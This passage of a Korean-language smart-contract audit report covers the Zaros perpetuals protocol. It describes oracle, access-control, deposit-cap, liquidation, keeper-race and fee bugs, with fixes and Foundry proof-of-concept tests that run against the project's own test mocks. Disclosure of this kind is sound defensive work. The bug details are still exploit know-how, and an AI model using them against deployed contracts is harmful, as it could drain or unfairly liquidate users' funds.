**권장 완화 방법:** `latestRoundData`가 반환한 `updatedAt`을 각 가격 피드의 [개별 하트비트](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#fb78)와 대조하여 확인하십시오. 하트비트는 다음에 저장될 수 있습니다:
* `MarginCollateralConfiguration::Data`
* `MarketConfiguration::Data`

**Zaros:** 커밋 [c70c9b9](https://github.com/zaros-labs/zaros-core/commit/c70c9b9399af8eb5e351f9b4f43feed82e19ef5b#diff-dc206ca4ca1f5e661061478ee4bd43c0c979d77a1ce1e0f30745d766bcd65394R39-R43)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `ChainlinkUtil::getPrice`가 L2 시퀀서가 다운되었는지 확인하지 않음

**설명:** Arbitrum과 같은 L2 체인에서 Chainlink를 사용할 때, 스마트 계약은 오래된 가격 데이터가 최신 데이터처럼 보이는 것을 방지하기 위해 [L2 시퀀서가 다운되었는지 확인](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf)해야 합니다.

**영향:** 코드가 현재 가격을 반영하지 않는 가격으로 실행되어 사용자에게 잠재적인 자금 손실을 초래할 수 있습니다.

**권장 완화 방법:** Chainlink의 공식 문서는 L2 시퀀서를 확인하는 [예제](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) 구현을 제공합니다.

**Zaros:** 커밋 [c927d94](https://github.com/zaros-labs/zaros-core/commit/c927d94d20f74c6c4e5bc7b7cca1038a6a7aa5e9) 및 [0ddd913](https://github.com/zaros-labs/zaros-core/commit/0ddd913eb9d8c7ac440f2814db8bff476f827c7b#diff-dc206ca4ca1f5e661061478ee4bd43c0c979d77a1ce1e0f30745d766bcd65394R42-R53)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `ChainlinkUtil::getPrice`는 기본 집계기(underlying aggregator)가 `minAnswer`에 도달할 때 잘못된 가격을 사용함

**설명:** Chainlink 가격 피드에는 반환할 최소 및 최대 가격이 내장되어 있습니다. 예상치 못한 이벤트로 인해 자산 가치가 가격 피드의 최소 가격 아래로 떨어지면, [오라클 가격 피드는 (현재 잘못된) 최소 가격을 계속 보고합니다](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac).

[`ChainlinkUtil::getPrice`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/external/chainlink/ChainlinkUtil.sol#L32-L33)는 이 경우를 처리하지 않습니다.

**영향:** 코드가 현재 가격을 반영하지 않는 가격으로 실행되어 사용자에게 잠재적인 자금 손실을 초래할 수 있습니다.

**권장 완화 방법:** `minAnswer < answer < maxAnswer`가 아닌 한 되돌리십시오(revert).

**Zaros:** 커밋 [b14b208](https://github.com/zaros-labs/zaros-core/commit/c927d94d20f74c6c4e5bc7b7cca1038a6a7aa5e9) 및 [4a5e53c](https://github.com/zaros-labs/zaros-core/commit/4a5e53c9c0f32e9b6d7e84a20cc47a9f6024def6#)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 사용자가 한도 미만의 여러 입금을 사용하여 담보 `depositCap` 제한을 쉽게 우회할 수 있음

**설명:** 마진 담보에는 특정 담보 유형에 대한 총 입금 금액을 제한하는 `depositCap` 설정이 있습니다.

그러나 `_requireEnoughDepositCap()`의 검증은 현재 입금되는 금액이 `depositCap`보다 클 때만 되돌립니다.

```solidity
function _requireEnoughDepositCap(address collateralType, UD60x18 amount, UD60x18 depositCap) internal pure {
    if (amount.gt(depositCap)) {
        revert Errors.DepositCap(collateralType, amount.intoUint256(), depositCap.intoUint256());
    }
}
```

해당 담보 유형에 대한 총 입금 금액을 확인하지 않으므로, 사용자는 각각 `depositCap` 미만인 별도의 트랜잭션을 사용하여 원하는 만큼 입금할 수 있습니다.

**영향:** 사용자는 `depositCap`보다 더 많은 마진 담보를 입금할 수 있습니다.

**권장 완화 방법:** `_requireEnoughDepositCap`은 해당 담보 유형에 대한 총 입금 금액에 새 입금을 더한 금액이 `depositCap`보다 크지 않은지 확인해야 합니다.

**Zaros:** 커밋 [0d37299](https://github.com/zaros-labs/zaros-core/commit/0d37299f6d5037afc9863dc6f0ae3871784ce376)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `OrderBranch::cancelMarketOrder`의 접근 제어 누락으로 인해 누구나 트레이더의 시장 주문을 취소할 수 있음

**설명:** `OrderBranch::cancelMarketOrder`의 접근 제어 누락으로 인해 누구나 트레이더의 시장 주문을 취소할 수 있습니다:

```solidity
function cancelMarketOrder(uint128 tradingAccountId) external {
    MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

    marketOrder.clear();

    emit LogCancelMarketOrder(msg.sender, tradingAccountId);
}
```

**영향:** 누구나 트레이더의 시장 주문을 취소할 수 있습니다.

**권장 완화 방법:** `OrderBranch::cancelMarketOrder`는 호출자가 거래 계정의 소유자인지 확인해야 합니다.

```diff
    function cancelMarketOrder(uint128 tradingAccountId) external {
+       TradingAccount.loadExistingAccountAndVerifySender(tradingAccountId);

        MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

        marketOrder.clear();

        emit LogCancelMarketOrder(msg.sender, tradingAccountId);
    }
```

**Zaros:** 커밋 [d37c37a](https://github.com/zaros-labs/zaros-core/commit/d37c37abab40bfa2320c6925c359faa501577eb3)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 프로토콜 운영자는 오픈 포지션이 있는 시장을 비활성화할 수 있어, 트레이더가 오픈 포지션을 닫는 것이 불가능하지만 여전히 잠재적인 청산 대상이 됨

**설명:** `GlobalConfigurationBranch::updatePerpMarketStatus`는 해당 시장에 오픈 포지션이 있는지 확인하지 않고 프로토콜 운영자가 시장을 비활성화할 수 있도록 허용합니다; 이는 운영자가 오픈 포지션이 있는 시장을 비활성화할 수 있게 합니다.

**영향:** 프로토콜은 이전에 시장에서 레버리지 포지션을 오픈한 트레이더가 이후에 해당 포지션을 닫을 수 없는 상태에 들어갈 수 있습니다. 그러나 시장이 비활성화된 경우에도 청산 코드는 계속 작동하므로 이러한 포지션은 여전히 청산 대상입니다.

따라서 프로토콜은 트레이더가 부당하게 심각한 불이익을 받는 상태에 들어갈 수 있습니다; 그들은 오픈 레버리지 포지션을 닫을 수 없지만 시장이 그들에게 불리하게 움직일 경우 여전히 청산 대상입니다.

**개념 증명 (Proof of Concept):** 다음 PoC를 `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 추가하십시오:
```solidity
function test_ImpossibleToClosePositionIfMarkedDisabledButStillLiquidatable() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // protocol operator disables the BTC market
    changePrank({ msgSender: users.owner });
    perpsEngine.updatePerpMarketStatus({ marketId: BTC_USD_MARKET_ID, enable: false });

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // naruto attmpts to close their opened leverage BTC position but it
    // reverts with PerpMarketDisabled error. However the position is still
    // subject to liquidation!
    //
    // after running this test the first time to verify it reverts with PerpMarketDisabled,
    // comment out this next line then re-run test to see Naruto can be liquidated
    // even though Naruto can't close their open position - very unfair!
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // make BTC position liquidatable
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // liquidate naruto - works fine! naruto was liquidated even though
    // they couldn't close their position!
    changePrank({ msgSender: liquidationKeeper });
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

실행: `forge test --match-test test_ImpossibleToClosePositionIfMarkedDisabledButStillLiquidatable -vvv`

**권장 완화 방법:** 청산은 항상 가능해야 하므로 비활성화된 시장에서 청산을 방지하는 것은 좋은 생각이 아닙니다. 두 가지 잠재적 옵션:
* 오픈 포지션이 있는 시장 비활성화 방지
* 비활성화된 시장에서 사용자가 오픈 포지션을 닫을 수 있도록 허용

**Zaros:** 커밋 [65b08f0](https://github.com/zaros-labs/zaros-core/commit/65b08f0e6b9187b251dfdc89dda08bc72b06e345)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 청산은 트레이더에게 더 건전하지 않고 위험한 담보 바스켓을 남겨, 향후 거래에서 청산될 가능성을 높임

**설명:** 프로토콜이 제안한 담보 우선순위 대기열과 관련 LTV(Loan-To-Value)는 다음과 같습니다:
```
1 - USDz   - 1e18 LTV
2 - USDC   - 1e18 LTV
3 - WETH   - 0.8e18 LTV
4 - WBTC   - 0.8e18 LTV
5 - wstETH - 0.7e18 LTV
6 - weETH  - 0.7e18 LTV
```

이는 프로토콜이 다음을 수행함을 의미합니다:
* LTV가 높은 더 안정적인 담보를 먼저 청산
* 이들이 소진된 후에만 LTV가 낮은 덜 안정적이고 위험한 담보를 청산

**영향:** 트레이더가 청산되면 남은 담보 바스켓에는 덜 안정적이고 더 위험한 담보가 포함됩니다. 이는 향후 거래에서 청산될 가능성을 높입니다.

**권장 완화 방법:** 담보 우선순위 대기열은 LTV가 낮은 위험하고 변동성이 큰 담보를 먼저 청산해야 합니다.

**Zaros:** 커밋 [5baa628](https://github.com/zaros-labs/zaros-core/commit/5baa628979d6d33ca042dfca2444c4403393b427)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 트레이더가 키퍼가 원래 주문을 처리하기 직전에 오픈 주문을 업데이트할 때, 키퍼가 잘못된 이전 `marketId`를 사용하지만 새로 업데이트된 포지션 크기를 사용하여 시장 주문을 채움

**설명:** 다음 시나리오를 고려하십시오:
1) 트레이더가 포지션 크기 POS_SIZE_A로 BTC 시장에 대한 주문을 생성합니다.
2) 시간이 지나도 주문이 키퍼에 의해 채워지지 않습니다.
3) 동시에:
3a) 키퍼가 트레이더의 현재 오픈 BTC 주문을 채우려고 시도합니다.
3b) 트레이더가 포지션 크기 POS_SIZE_B로 다른 시장에 대한 주문을 업데이트하는 트랜잭션을 생성합니다.

3b)가 3a)보다 먼저 실행되면 3a)가 실행될 때 키퍼는 주문을 채웁니다:
* 잘못된 이전 BTC 시장에 대해
* 그러나 새로 업데이트된 포지션 크기 POS_SIZE_B로!

**영향:** 키퍼는 잘못된 포지션 크기로 잘못된 시장에 대한 주문을 채우게 됩니다.

**개념 증명 (Proof of Concept):** `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 PoC를 추가하십시오:
```solidity
// additional import at top
import { Position } from "@zaros/perpetuals/leaves/Position.sol";

function test_KeeperFillsOrderToIncorrectMarketAfterUserUpdatesOpenOrder() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto creates an open order in the BTC market
    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: tradingAccountId,
            marketId: BTC_USD_MARKET_ID,
            sizeDelta: USER_POS_SIZE_DELTA
        })
    );

    // some time passes and the order is not filled
    vm.warp(block.timestamp + MARKET_ORDER_MAX_LIFETIME + 1);

    // at the same time:
    // 1) keeper creates a transaction to fill naruto's open BTC order
    // 2) naruto updates their open order to place it on ETH market

    // 2) gets executed first; naruto changes position size and market id
    int128  USER_POS_2_SIZE_DELTA = 5e18;

    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: tradingAccountId,
            marketId: ETH_USD_MARKET_ID,
            sizeDelta: USER_POS_2_SIZE_DELTA
        })
    );

    // 1) gets executed afterwards - the keeper is calling this
    // with the parameters of the first opened order, in this case
    // with BTC's market id and price !
    bytes memory mockSignedReport = getMockedSignedReport(BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE);
    changePrank({ msgSender: marketOrderKeepers[BTC_USD_MARKET_ID] });
    perpsEngine.fillMarketOrder(tradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);

    // the keeper filled Naruto's original BTC order even though
    // Naruto had first updated the order to be for the ETH market;
    // Naruto now has an open BTC position. Also it was filled using
    // the *updated* order size!
    changePrank({ msgSender: users.naruto });

    // load naruto's position for BTC market
    Position.State memory positionState = perpsEngine.getPositionState(tradingAccountId, BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE);

    // verify that the position size of the filled BTC position
    // matches the size of the updated ETH order!
    assertEq(USER_POS_2_SIZE_DELTA, positionState.sizeX18.intoInt256());
}
```

실행: `forge test --match-test test_KeeperFillsOrderToIncorrectMarketAfterUserUpdatesOpenOrder -vvv`

**권장 완화 방법:** `settlementBranch::fillMarketOrder`는 `marketId != marketOrder.marketId`인 경우 되돌려야 합니다.

**Zaros:** 커밋 [31a19ef](https://github.com/zaros-labs/zaros-core/commit/31a19ef9113aed94e291160e7eaf5fc399671170#diff-572572bb95cc7c9ffd3c366fe793b714965688505695c496cf74bed94c8cc976R57-R60)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`가 주문 정산 중 잘못된 가격을 사용함

**설명:** 주문 정산 중 `SettlementBranch::_fillOrder`는 키퍼가 제공한 오프체인 가격을 사용합니다:

```solidity
File: SettlementBranch.sol
120:         ctx.fillPrice = perpMarket.getMarkPrice(
121:             ctx.sizeDelta, settlementConfiguration.verifyOffchainPrice(priceData, ctx.sizeDelta.gt(SD_ZERO))
122:         );
123:
124:         ctx.fundingRate = perpMarket.getCurrentFundingRate();
125:         ctx.fundingFeePerUnit = perpMarket.getNextFundingFeePerUnit(ctx.fundingRate, ctx.fillPrice);
```

`ctx.fillPrice` 및 `ctx.fundingFeePerUnit`을 포함한 모든 변수는 이 가격을 기준으로 계산됩니다.

그러나 `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`의 증거금 요건 검증 중에는 키퍼가 제공한 가격 입력을 사용하지 않고 대신 인덱스 가격을 사용합니다:

```solidity
File: TradingAccount.sol
207:             UD60x18 markPrice = perpMarket.getMarkPrice(sizeDeltaX18, perpMarket.getIndexPrice());
208:             SD59x18 fundingFeePerUnit =
209:                 perpMarket.getNextFundingFeePerUnit(perpMarket.getCurrentFundingRate(), markPrice);
```

**영향:** `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`의 모든 계산은 키퍼가 제공한 가격이 현재 인덱스 가격과 다를 수 있으므로 올바르지 않을 수 있습니다. 따라서 주문 정산 중 `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`는 잘못된 출력을 반환할 수 있습니다.

**권장 완화 방법:** 주문 정산 중 `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`는 `targetMarketId`에 대해 키퍼가 제공한 것과 동일한 오프체인 가격을 사용해야 합니다.

**Zaros:** 확인됨; 이는 V2에서 리팩토링할 예정입니다. 실제로는 차이가 미미합니다; "최악의 경우" 시나리오에서는 사용자가 초기 증거금 요건보다 약간 부족하더라도 주문이 채워질 수 있습니다. 바람직하지는 않지만 사용자는 유지 증거금에서 즉시 청산 대상이 되지 않으므로 여기서의 영향은 매우 미미해 보입니다.


### 프로토콜 운영자가 오픈 포지션이 있는 시장에 대한 정산을 비활성화할 수 있어, 트레이더가 오픈 포지션을 닫는 것이 불가능하지만 여전히 잠재적인 청산 대상이 됨

**설명:** `GlobalConfiguration::updateSettlementConfiguration`은 해당 시장에 오픈 포지션이 있는지 확인하지 않고 프로토콜 운영자가 시장에 대한 정산을 비활성화할 수 있도록 허용합니다; 이는 운영자가 오픈 포지션이 있는 시장에 대한 정산을 비활성화할 수 있게 합니다.

**영향:** 프로토콜은 이전에 시장에서 레버리지 포지션을 오픈한 트레이더가 이후에 해당 포지션을 닫을 수 없는 상태에 들어갈 수 있습니다. 그러나 정산이 비활성화된 경우에도 청산 코드는 계속 작동하므로 이러한 포지션은 여전히 청산 대상입니다.

따라서 프로토콜은 트레이더가 부당하게 심각한 불이익을 받는 상태에 들어갈 수 있습니다; 그들은 오픈 레버리지 포지션을 닫을 수 없지만 시장이 그들에게 불리하게 움직일 경우 여전히 청산 대상입니다.

**개념 증명 (Proof of Concept):** 다음 PoC를 `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 추가하십시오:
```solidity
// new import at top
import { IVerifierProxy } from "@zaros/external/chainlink/interfaces/IVerifierProxy.sol";

function test_ImpossibleToClosePositionIfSettlementDisabledButStillLiquidatable() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // protocol operator disables settlement for the BTC market
    changePrank({ msgSender: users.owner });

    SettlementConfiguration.DataStreamsStrategy memory marketOrderConfigurationData = SettlementConfiguration
        .DataStreamsStrategy({ chainlinkVerifier: IVerifierProxy(mockChainlinkVerifier), streamId: BTC_USD_STREAM_ID });

    SettlementConfiguration.Data memory marketOrderConfiguration = SettlementConfiguration.Data({
        strategy: SettlementConfiguration.Strategy.DATA_STREAMS_ONCHAIN,
        isEnabled: false,
        fee: DEFAULT_SETTLEMENT_FEE,
        keeper: marketOrderKeepers[BTC_USD_MARKET_ID],
        data: abi.encode(marketOrderConfigurationData)
    });

    perpsEngine.updateSettlementConfiguration(BTC_USD_MARKET_ID,
                                              SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
                                              marketOrderConfiguration);

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // naruto attmpts to close their opened leverage BTC position but it
    // reverts with PerpMarketDisabled error. However the position is still
    // subject to liquidation!
    //
    // after running this test the first time to verify it reverts with SettlementDisabled,
    // comment out this next line then re-run test to see Naruto can be liquidated
    // even though Naruto can't close their open position - very unfair!
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // make BTC position liquidatable
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // liquidate naruto - works fine! naruto was liquidated even though
    // they couldn't close their position!
    changePrank({ msgSender: liquidationKeeper });
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

실행: `forge test --match-test test_ImpossibleToClosePositionIfSettlementDisabledButStillLiquidatable -vvv`

**권장 완화 방법:** 청산은 항상 가능해야 하므로 정산이 비활성화된 경우 청산을 방지하는 것은 좋은 생각이 아닙니다. 두 가지 잠재적 옵션:
* 오픈 포지션이 있는 시장에 대한 정산 비활성화 방지
* 정산이 비활성화된 시장에서 사용자가 오픈 포지션을 닫을 수 있도록 허용

**Zaros:** 커밋 [08d96cf](https://github.com/zaros-labs/zaros-core/commit/08d96cf40c92470454afd4f261b3bc1921845e58)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 펀딩 비율 매개변수에 대한 업데이트가 누적된 펀딩 비율에 소급적으로 영향을 미침

**설명:** 중앙 집중식 무기한 선물 프로토콜에서 펀딩 비율은 일반적으로 8시간마다 정산되지만, Zaros에서는 "누적"되며 트레이더가 자신의 포지션과 상호 작용할 때 정산됩니다. 프로토콜 소유자는 펀딩 비율 매개변수를 변경할 권한도 가지고 있으며, 변경 시 소급적으로 적용됩니다.

**영향:** 포지션을 자주 수정하지 않는 트레이더는 펀딩 비율 매개변수 변경으로 인해 긍정적이거나 부정적인 소급적 영향을 받을 수 있습니다. 트레이더는 현재 구성 매개변수에서 펀딩 비율을 적립하고 있다는 인상을 받기 때문에 소급 적용은 트레이더에게 불공정합니다.

**개념 증명 (Proof of Concept):** 다음 PoC를 `test/integration/order-branch/createMarketOrder/createMarketOrder.t.sol`에 추가하십시오:
```solidity
function test_configChangeRetrospectivelyImpactsAccruedFundingRates() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // naruto keeps their position open for 1 week
    vm.warp(block.timestamp + 1 weeks);

    // snapshot EVM state at this point
    uint256 snapshotId = vm.snapshot();

    // naruto closes their BTC position
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken),
        perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256());

    // verify that naruto has lost $ due to order/settlement fees
    // and paying funding rate
    uint256 firstEndBalance = usdToken.balanceOf(users.naruto); // 99122 456325000000000000
    assertEq(99122456325000000000000, firstEndBalance);

    // restore EVM state to snapshot
    vm.revertTo(snapshotId);

    // right before naruto closes their position, protocol admin
    // changes parameters which affect the funding rates
    GlobalConfigurationBranch.UpdatePerpMarketConfigurationParams memory params =
        GlobalConfigurationBranch.UpdatePerpMarketConfigurationParams({
        marketId: BTC_USD_MARKET_ID,
        name: marketsConfig[BTC_USD_MARKET_ID].marketName,
        symbol: marketsConfig[BTC_USD_MARKET_ID].marketSymbol,
        priceAdapter: marketsConfig[BTC_USD_MARKET_ID].priceAdapter,
        initialMarginRateX18: marketsConfig[BTC_USD_MARKET_ID].imr,
        maintenanceMarginRateX18: marketsConfig[BTC_USD_MARKET_ID].mmr,
        maxOpenInterest: marketsConfig[BTC_USD_MARKET_ID].maxOi,
        maxSkew: marketsConfig[BTC_USD_MARKET_ID].maxSkew,
        // protocol admin increases max funding velocity
        maxFundingVelocity: BTC_USD_MAX_FUNDING_VELOCITY * 10,
        minTradeSizeX18: marketsConfig[BTC_USD_MARKET_ID].minTradeSize,
        skewScale: marketsConfig[BTC_USD_MARKET_ID].skewScale,
        orderFees: marketsConfig[BTC_USD_MARKET_ID].orderFees
    });

    changePrank({ msgSender: users.owner });
    perpsEngine.updatePerpMarketConfiguration(params);

    // naruto then closes their BTC position
    changePrank({ msgSender: users.naruto });

    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken),
        perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256());

    // verify that naruto has lost $ due to order/settlement fees
    // and paying funding rate
    uint256 secondEndBalance = usdToken.balanceOf(users.naruto); // 98460 923250000000000000
    assertEq(98460923250000000000000, secondEndBalance);

    // the update to the funding configuration parameter was
    // applied retrospectively increasing the funding rate
    // naruto had to pay for holding their position the entire
    // time - rather unfair!
    assert(secondEndBalance < firstEndBalance);
}
```

실행: `forge test --match-test test_configChangeRetrospectivelyImpactsAccruedFundingRates -vvv`

**권장 완화 방법:** 이상적으로는 펀딩 비율이 8시간마다와 같이 정기적인 간격으로 정산되어야 하며, 프로토콜 소유자가 주요 펀딩 비율 매개변수를 변경하기 전에 모든 오픈 포지션에 대한 펀딩 비율이 먼저 정산되어야 합니다.

그러나 이는 탈중앙화 시스템에서는 실현 불가능할 수 있습니다.

**Zaros:** 확인됨.


### PNL이 양수이면 `SettlementBranch::_fillOrder`가 주문 및 정산 수수료를 지불하지 않음

**설명:** `SettlementBranch::_fillOrder`는 L161에서 PNL을 계산하는 동안 계산된 PNL에서 이러한 수수료를 공제하지만, L204 주변에서 나중에 PNL이 양수이면 적절한 수수료 수취인에게 주문 및 정산 수수료를 지불하지 않습니다.

```solidity
File: SettlementBranch.sol
159:         ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
160:             oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
161:         ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
...
204:         } else if (ctx.pnl.gt(SD_ZERO)) {
205:             UD60x18 amountToIncrease = ctx.pnl.intoUD60x18();
206:             tradingAccount.deposit(ctx.usdToken, amountToIncrease);
```

**영향:** 주문 및 정산 수수료 수취인은 의도한 것보다 적은 자금을 받게 됩니다.

**권장 완화 방법:** `SettlementBranch::_fillOrder`는 PNL이 양수일 때 적절한 수취인에게 주문 및 정산 수수료를 지불해야 합니다.

**Zaros:** 커밋 [516bc2a](https://github.com/zaros-labs/zaros-core/commit/516bc2ad61d64e94654db500a93bd19567ca01e5)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 낮은 위험 (Low Risk)


### `TradingAccount::deductAccountMargin`이 출력 매개변수 `marginDeductedUsdX18`에 동일한 값을 여러 번 잘못 추가할 수 있음

**설명:** `TradingAccount::deductAccountMargin`의 `for` 루프 내에서 `ctx.settlementFeeDeductedUsdX18`, `ctx.orderFeeDeductedUsdX18`, `ctx.pnlDeductedUsdX18`이 `marginDeductedUsdX18`에 추가됩니다:
```solidity
File: TradingAccount.sol
443:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.settlementFeeDeductedUsdX18);
458:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.orderFeeDeductedUsdX18);
475:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.pnlDeductedUsdX18);
```

**영향:** 이 3가지 값은 누적된 출금 담보 금액이므로 동일한 금액이 여러 번 추가되어 `marginDeductedUsdX18`이 예상보다 커질 것입니다.

**개념 증명 (Proof of Concept):** 다음 시나리오를 고려하십시오:
* 정산 수수료 `if` 문이 `ctx.isMissingMargin == false`로 한 번 실행됨
* 이것은 `marginDeductedUsdX18`을 `ctx.settlementFeeDeductedUsdX18`만큼 증가시킴
* 주문 수수료 `if` 문이 `ctx.isMissingMargin == true`로 한 번 실행됨
* 이것은 다음 루프 반복으로 즉시 점프하는 `continue`를 트리거함
* 정산 수수료가 지불되었으므로 정산 수수료 `if` 문은 건너뜀
* `marginDeductedUsdX18`이 다시 `ctx.settlementFeeDeductedUsdX18`만큼 증가함!

이 시나리오에서 `marginDeductedUsdX18`은 `ctx.settlementFeeDeductedUsdX18`에 의해 두 번 증가했습니다. `ctx.orderFeeDeductedUsdX18`에서도 동일한 일이 발생할 수 있습니다.

**권장 완화 방법:** 루프 내부 대신 함수 끝에서 `marginDeductedUsdX18`을 업데이트하십시오:

```solidity
function deductAccountMargin() {
    for (uint256 i = 0; i < globalConfiguration.collateralLiquidationPriority.length(); i++) {
        /* snip: loop processing */
        // @audit removed updates to `marginDeductedUsdX18` during loop
    }

    // @audit update `marginDeductedUsdX18` only once at end of loop
    marginDeductedUsdX18 = ctx.settlementFeeDeductedUsdX18.add(ctx.orderFeeDeductedUsdX18).add(ctx.pnlDeductedUsdX18);
}
```

**Zaros:** 커밋 [9bcf9f8](https://github.com/zaros-labs/zaros-core/commit/9bcf9f83d11d8da9113c38f01404985f37dc763d)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 메이커/테이커 수수료가 음수인 시장에서 PNL이 음수인 포지션에 대해 `SettlementBranch::_fillOrder`가 되돌려질(revert) 수 있음

**설명:** `SettlementBranch::_fillOrder`는 포지션의 PNL을 `pnl = (unrealizedPnl + accruedFunding) + (unary(orderFee + settlementFee))`로 계산합니다:

```solidity
File: SettlementBranch.sol
141: ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
142:     oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
143:     ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
144:
```

PNL이 음수이면 `marginToDeductUsdX18`은 정산/주문 수수료를 차감하여 계산됩니다.

```solidity
171: if (ctx.pnl.lt(SD_ZERO)) {
172:     UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
